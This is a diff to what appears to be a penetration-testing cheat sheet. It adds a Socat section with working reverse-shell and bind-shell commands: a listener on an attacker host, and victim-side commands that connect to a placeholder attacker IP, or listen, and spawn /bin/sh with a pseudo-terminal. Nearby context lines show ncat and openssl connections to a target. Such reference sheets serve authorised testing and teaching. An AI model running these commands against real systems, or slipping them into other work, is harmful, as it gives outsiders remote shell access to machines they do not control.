@@ -245,6 +245,36 @@ ncat -vC --ssl www.target.org 443
 openssl s_client -crlf -connect www.target.org:443
 ```
 
+## Socat:
+
+Reverse shell:
+
+On the attack platform:
+
+```
+root@attacker# socat file:`tty`,raw,echo=0 tcp-listen:5555
+```
+
+On the victim platform:
+
+```
+user@victim $ socat tcp-connect:<Attacker IP>:5555 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+```
+
+Bind shell:
+
+On the attack platform:
+
+```
+root@attacker# socat FILE:`tty`,raw,echo=0 TCP:<Target IP>:5555
+```
+
+On the victim platform:
+
+```
+user@victim $ socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+```
+
 ## Java:
 
 ```
